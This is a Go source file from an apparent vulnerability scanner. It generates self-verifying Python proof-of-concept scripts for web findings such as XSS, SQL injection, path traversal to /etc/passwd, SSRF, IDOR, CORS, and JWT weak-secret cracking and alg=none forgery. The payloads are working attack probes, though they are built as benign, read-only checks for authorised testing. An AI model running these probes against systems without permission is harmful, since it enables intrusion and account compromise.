// Package poc menghasilkan PoC script self-verifying (poc.py) per finding.
// Kontrak exit code: 0=confirmed TP, 2=false positive, 3=inconclusive, 4=blocked.
// Lihat docs/10-POC-VALIDATION.md.
package poc

import (
	"fmt"
	"strings"
)

// Generate membuat isi poc.py untuk kelas finding yang didukung.
// PoC selalu read-only, memakai payload marker jinak, dan mencetak verdict sendiri.
func Generate(class, targetURL string) (string, bool) {
	switch class {
	case "exposure":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - Exposed file (dihasilkan xyland)
Target : %s
Safety : Level 0/1 read-only. Jalankan hanya pada target berizin & in-scope.
Exit   : 0=confirmed TP | 2=false positive | 3=inconclusive
"""
import sys, urllib.request, urllib.error

URL = %q
MARKERS = ["[core]", "ref: refs/", "repositoryformatversion"]

def fetch(u):
    try:
        req = urllib.request.Request(u, headers={"User-Agent": "xyland-poc"})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception:
        return None, ""

def main():
    hits = 0
    for _ in range(2):
        st, body = fetch(URL)
        if st is None:
            print("VERDICT: INCONCLUSIVE"); return 3
        if st == 200 and any(m in body for m in MARKERS):
            hits += 1
    base = URL.rsplit("/", 2)[0] + "/xyland-baseline-nonexistent"
    _, bbody = fetch(base)
    if hits == 2 and not any(m in bbody for m in MARKERS):
        print("VERDICT: CONFIRMED_TRUE_POSITIVE"); return 0
    print("VERDICT: FALSE_POSITIVE"); return 2

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true

	case "xss-reflected":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - Reflected XSS (dihasilkan xyland) - payload marker non-destruktif.
CATATAN: konfirmasi akhir kelas ini wajib executor browser (DOM execution).
Target : %s
Exit   : 0=refleksi tanpa encoding terkonfirmasi (likely TP) | 2=FP | 3=inconclusive
"""
import sys, urllib.request, urllib.parse, urllib.error

URL = %q
PAYLOAD = "xyland<svg/onload=1>"

def fetch(u):
    try:
        req = urllib.request.Request(u, headers={"User-Agent": "xyland-poc"})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.read().decode("utf-8", "ignore")
    except Exception:
        return None

def with_param(u, v):
    p = urllib.parse.urlparse(u)
    q = urllib.parse.parse_qs(p.query)
    if not q: return u
    k = next(iter(q)); q[k] = [v]
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q, doseq=True)))

def main():
    ok = 0
    for _ in range(2):
        body = fetch(with_param(URL, PAYLOAD))
        if body is None:
            print("VERDICT: INCONCLUSIVE"); return 3
        if PAYLOAD in body: ok += 1
    if ok == 2:
        print("VERDICT: REFLECTED_UNENCODED (validasi browser untuk konfirmasi DOM)"); return 0
    print("VERDICT: FALSE_POSITIVE"); return 2

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true

	case "open-redirect":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - Open Redirect (dihasilkan xyland) - marker domain milik penguji.
Target : %s
Exit   : 0=confirmed TP | 2=false positive | 3=inconclusive
"""
import urllib.request, urllib.parse

URL = %q
MARKER = "https://marker.xyland.invalid/"

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k): return None

def location(u):
    try:
        req = urllib.request.Request(u, headers={"User-Agent": "xyland-poc"})
        urllib.request.build_opener(NoRedirect).open(req, timeout=10)
        return None
    except urllib.error.HTTPError as e:
        return e.headers.get("Location")
    except Exception:
        return "ERR"

def with_param(u, v):
    p = urllib.parse.urlparse(u)
    q = urllib.parse.parse_qs(p.query)
    for k in q:
        if k.lower() in ("next","url","redirect","return","target","dest"):
            q[k] = [v]; break
    else:
        if q: q[next(iter(q))] = [v]
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q, doseq=True)))

def main():
    loc = location(with_param(URL, MARKER))
    if loc == "ERR":
        print("VERDICT: INCONCLUSIVE"); return 3
    if loc and loc.startswith(MARKER):
        print("VERDICT: CONFIRMED_TRUE_POSITIVE"); return 0
    print("VERDICT: FALSE_POSITIVE"); return 2

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true

	case "idor":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - IDOR / Broken Access Control (dihasilkan xyland)
Sesi dibaca dari ENV (tidak ada kredensial di file ini):
  XYLAND_COOKIE_A="session=..." XYLAND_COOKIE_B="session=..." python3 poc.py
Target : %s
Exit   : 0=confirmed (B membaca objek A) | 2=false positive | 3=inconclusive
"""
import os, urllib.request, urllib.error

URL = %q

def fetch(u, cookie):
    try:
        req = urllib.request.Request(u, headers={"Cookie": cookie, "User-Agent": "xyland-poc"})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception:
        return None, ""

def main():
    a = os.environ.get("XYLAND_COOKIE_A"); b = os.environ.get("XYLAND_COOKIE_B")
    if not a or not b:
        print("VERDICT: INCONCLUSIVE (env sesi belum diisi)"); return 3
    sa, own = fetch(URL, a)
    sb, cross = fetch(URL, b)
    if sa != 200 or sb != 200 or not own:
        print("VERDICT: INCONCLUSIVE"); return 3
    if own.strip() == cross.strip():
        print("VERDICT: CONFIRMED (sesi B membaca objek sesi A)"); return 0
    print("VERDICT: FALSE_POSITIVE"); return 2

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true

	case "ssrf-blind":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - SSRF Blind via callback OOB (dihasilkan xyland)
Menjalankan listener lokal lalu meminta target mengambil URL unik kita.
CATATAN: target harus bisa menjangkau listener ini (lab/LAN sama, atau
pakai host publik Anda dan sesuaikan CALLBACK_BASE).
Target : %s
Exit   : 0=callback diterima (confirmed) | 2=tidak ada callback | 3=inconclusive
"""
import threading, urllib.request, urllib.parse, http.server, secrets

URL = %q
CALLBACK_BASE = "http://127.0.0.1:8899"
TOKEN = "xy" + secrets.token_hex(6)
hits = []

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if TOKEN in self.path: hits.append(self.path)
        self.send_response(200); self.end_headers()
    def log_message(self, *a): pass

def withu(u):
    p = urllib.parse.urlparse(u); q = urllib.parse.parse_qs(p.query)
    KEYS = ("url","uri","link","callback","webhook","fetch","image","img","src","endpoint","proxy","load","resource")
    pick = next((k for k in q if k.lower() in KEYS), next(iter(q), None))
    if pick is None: return u
    q[pick] = [CALLBACK_BASE + "/" + TOKEN]
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q, doseq=True)))

def main():
    srv = http.server.HTTPServer(("127.0.0.1", 8899), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        req = urllib.request.Request(withu(URL), headers={"User-Agent": "xyland-poc"})
        urllib.request.urlopen(req, timeout=10).read()
    except Exception:
        pass
    import time; time.sleep(3)
    srv.shutdown()
    if hits:
        print("VERDICT: CONFIRMED (callback diterima:", hits[0], ")"); return 0
    print("VERDICT: NO_CALLBACK (bisa FP, atau target tidak bisa menjangkau listener)"); return 2

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true

	case "sqli":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - SQL Injection DETEKSI (dihasilkan xyland) - error-based saja, TIDAK mengekstrak data.
Target : %s
Exit   : 0=error SQL terkonfirmasi | 2=false positive | 3=inconclusive
"""
import urllib.request, urllib.parse, urllib.error

URL = %q
ERRS = ["sql syntax","you have an error in your sql","sqlite","sqlstate","ora-0","syntax error at or near"]

def fetch(u):
    try:
        req = urllib.request.Request(u, headers={"User-Agent":"xyland-poc"})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.read().decode("utf-8","ignore")
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8","ignore")
    except Exception:
        return None

def withq(u, suffix):
    p = urllib.parse.urlparse(u); q = urllib.parse.parse_qs(p.query)
    if not q: return u
    k = next(iter(q)); q[k] = [q[k][0] + suffix]
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q, doseq=True)))

def has_err(body):
    lb = (body or "").lower()
    return any(e in lb for e in ERRS)

def main():
    base = fetch(URL)
    if base is None: print("VERDICT: INCONCLUSIVE"); return 3
    hits = sum(1 for _ in range(2) if has_err(fetch(withq(URL, "'"))))
    if hits == 2 and not has_err(base):
        print("VERDICT: CONFIRMED (error-based, deteksi saja)"); return 0
    print("VERDICT: FALSE_POSITIVE"); return 2

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true

	case "path-traversal":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - Path Traversal (dihasilkan xyland) - membaca /etc/passwd sebagai bukti (file publik-aman).
Target : %s
Exit   : 0=confirmed TP | 2=false positive | 3=inconclusive
"""
import urllib.request, urllib.parse, urllib.error

URL = %q

def fetch(u):
    try:
        req = urllib.request.Request(u, headers={"User-Agent":"xyland-poc"})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.read().decode("utf-8","ignore")
    except Exception:
        return None

def witht(u):
    p = urllib.parse.urlparse(u); q = urllib.parse.parse_qs(p.query)
    keys = [k for k in q if k.lower() in ("file","path","page","template","doc","include","filename","dir","view","name")]
    if not q: return u
    k = keys[0] if keys else next(iter(q)); q[k] = ["../../../../etc/passwd"]
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q, doseq=True)))

def main():
    hits = 0
    for _ in range(2):
        b = fetch(witht(URL))
        if b is None: print("VERDICT: INCONCLUSIVE"); return 3
        if "root:x:0:0:" in b: hits += 1
    if hits == 2: print("VERDICT: CONFIRMED_TRUE_POSITIVE"); return 0
    print("VERDICT: FALSE_POSITIVE"); return 2

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true

	case "cors":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - CORS Misconfiguration (dihasilkan xyland)
Target : %s
Exit   : 0=refleksi berkredensial terkonfirmasi | 2=false positive | 3=inconclusive
"""
import urllib.request

URL = %q
ORIGIN = "https://evil.xyland.invalid"

def main():
    try:
        req = urllib.request.Request(URL, headers={"Origin": ORIGIN, "User-Agent":"xyland-poc"})
        with urllib.request.urlopen(req, timeout=10) as r:
            acao = r.headers.get("Access-Control-Allow-Origin")
            acac = (r.headers.get("Access-Control-Allow-Credentials") or "").lower()
    except Exception:
        print("VERDICT: INCONCLUSIVE"); return 3
    if acao == ORIGIN and acac == "true":
        print("VERDICT: CONFIRMED (origin dipantulkan + kredensial)"); return 0
    print("VERDICT: FALSE_POSITIVE"); return 2

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true
	case "jwt":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - JWT (dihasilkan xyland). Token dibaca dari ENV (tidak disimpan di file):
  XYLAND_JWT="eyJ..." python3 poc.py
Dua uji: (1) crack signature HS* terhadap daftar secret umum (offline),
(2) token alg=none dibandingkan dengan token valid & tanpa auth.
Target : %s
Exit   : 0=confirmed (secret ketemu / none diterima) | 2=false positive | 3=inconclusive
"""
import os, json, base64, hmac, hashlib, urllib.request, urllib.error

URL = %q
SECRETS = ["secret","secretkey","secret123","key","password","changeme","jwtsecret","jwt-secret","your-secret-key","mysecret","supersecret","s3cret","test","admin","default","keyboard cat","qwerty","123456","please-change-me","secret-key"]

def b64d(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) %% 4))

def b64e(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def fetch(u, tok=None):
    try:
        req = urllib.request.Request(u, headers={"User-Agent": "xyland-poc"})
        if tok: req.add_header("Authorization", "Bearer " + tok)
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception:
        return None, ""

def main():
    tok = os.environ.get("XYLAND_JWT", "")
    parts = tok.split(".")
    if len(parts) != 3:
        print("VERDICT: INCONCLUSIVE (set XYLAND_JWT dengan token asli)"); return 3
    hdr = json.loads(b64d(parts[0]))
    alg = hdr.get("alg", "")
    if alg.startswith("HS"):
        hf = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(alg, hashlib.sha256)
        sig = b64d(parts[2]); msg = (parts[0] + "." + parts[1]).encode()
        for s in SECRETS:
            if hmac.new(s.encode(), msg, hf).digest() == sig:
                print("VERDICT: CONFIRMED (secret HMAC lemah:", s, ")"); return 0
    # uji alg=none
    nh = b64e(json.dumps({"alg": "none", "typ": hdr.get("typ", "JWT")}).encode())
    none_tok = nh + "." + parts[1] + "."
    sb, base = fetch(URL)
    sv, valid = fetch(URL, tok)
    sn, none = fetch(URL, none_tok)
    if None in (sb, sv, sn):
        print("VERDICT: INCONCLUSIVE (jaringan)"); return 3
    if sn == 200 and sv == 200 and none.strip() == valid.strip() and none.strip() != base.strip():
        print("VERDICT: CONFIRMED (alg=none diterima)"); return 0
    print("VERDICT: FALSE_POSITIVE (kedua uji negatif)"); return 2

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true

	case "csrf":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - CSRF (dihasilkan xyland) - inventaris pasif: form POST tanpa token anti-CSRF.
CATATAN: bukti pasif = verdict LIKELY; eksploitasi penuh butuh halaman penyerang
lintas origin + sesi korban, di luar cakupan PoC read-only ini.
Target : %s
Exit   : 0=form rentan ditemukan (likely) | 2=semua form ber-token | 3=inconclusive
"""
import urllib.request, html.parser

URL = %q
HINTS = ("csrf", "token", "authenticity", "_nonce", "verification")

class FP(html.parser.HTMLParser):
    def __init__(self):
        super().__init__(); self.forms = []; self.cur = None
    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form": self.cur = {"method": a.get("method", "get").upper(), "action": a.get("action", ""), "names": []}
        elif tag in ("input", "textarea", "select") and self.cur is not None and a.get("name"):
            self.cur["names"].append(a["name"].lower())
    def handle_endtag(self, tag):
        if tag == "form" and self.cur is not None:
            self.forms.append(self.cur); self.cur = None

def main():
    try:
        req = urllib.request.Request(URL, headers={"User-Agent": "xyland-poc"})
        body = urllib.request.urlopen(req, timeout=10).read().decode("utf-8", "ignore")
    except Exception:
        print("VERDICT: INCONCLUSIVE"); return 3
    p = FP(); p.feed(body)
    bad = [f for f in p.forms if f["method"] == "POST" and not any(h in n for n in f["names"] for h in HINTS)]
    if bad:
        print("VERDICT: LIKELY (form POST tanpa token:", [f["action"] for f in bad], ")"); return 0
    print("VERDICT: FALSE_POSITIVE"); return 2

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true

	case "file-upload":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - File Upload (dihasilkan xyland): unggah SVG bermarker unik, lalu buktikan
file tersaji kembali dari origin target. Jalankan dari halaman yang memuat form.
Target : %s
Exit   : 0=confirmed tersaji aktif | 2=tidak tersaji | 3=inconclusive
"""
import urllib.request, urllib.parse, uuid

PAGE = %q
MARKER = "XYLAND-UPLOAD-MARKER-7F3A"
NAME = "xyland-test.svg"
SVG = '<svg xmlns="http://www.w3.org/2000/svg"><text x="5" y="20">' + MARKER + "</text></svg>"

def get(u):
    try:
        req = urllib.request.Request(u, headers={"User-Agent": "xyland-poc"})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.headers.get_content_type(), r.read().decode("utf-8", "ignore")
    except Exception:
        return None, "", ""

def main():
    # form upload diasumsikan POST multipart ke halaman yang sama (pola umum lab/CMS)
    boundary = "----xyland" + uuid.uuid4().hex
    body = ("--" + boundary + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + NAME + "\"\r\n"
            "Content-Type: image/svg+xml\r\n\r\n" + SVG + "\r\n--" + boundary + "--\r\n").encode()
    try:
        req = urllib.request.Request(PAGE, data=body, headers={"Content-Type": "multipart/form-data; boundary=" + boundary, "User-Agent": "xyland-poc"})
        urllib.request.urlopen(req, timeout=10).read()
    except Exception:
        print("VERDICT: INCONCLUSIVE (submit gagal — sesuaikan action/field dari temuan)"); return 3
    base = urllib.parse.urlparse(PAGE)
    root = base.scheme + "://" + base.netloc
    for pref in ("/uploads/", "/upload/", "/files/", "/media/"):
        st, ct, b = get(root + pref + NAME)
        if MARKER in b:
            if "svg" in ct or "html" in ct:
                print("VERDICT: CONFIRMED (tersaji aktif di", root + pref + NAME, ")"); return 0
            print("VERDICT: LIKELY (tersimpan & publik, content-type netral)"); return 0
    print("VERDICT: FALSE_POSITIVE (lokasi penyajian tidak ditemukan)"); return 2

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true

	case "xss-dom":
		return fmt.Sprintf(`#!/usr/bin/env python3
"""
PoC - DOM XSS (dihasilkan xyland). Verifikasi kelas ini memerlukan browser:
buka URL berikut di browser — bila halaman rentan, payload mengeksekusi dan
memasang atribut data-xyland="pwned" pada <body> (cek via DevTools console:
document.body.getAttribute('data-xyland')). xyland sendiri memverifikasi ini
dengan executor browser (rod) saat scan.
Target : %s
Exit   : 3=inconclusive (butuh browser, sesuai kontrak)
"""
import urllib.parse

URL = %q
PAYLOAD = "<img src=x onerror=document.body.setAttribute('data-xyland','pwned')>"

def main():
    print("Buka di browser:", URL.split("#")[0] + "#" + urllib.parse.quote(PAYLOAD, safe="/"))
    print("VERDICT: INCONCLUSIVE (verifikasi DOM butuh browser)"); return 3

if __name__ == "__main__":
    raise SystemExit(main())
`, targetURL, targetURL), true

	}
	return "", false
}

var _ = strings.TrimSpace
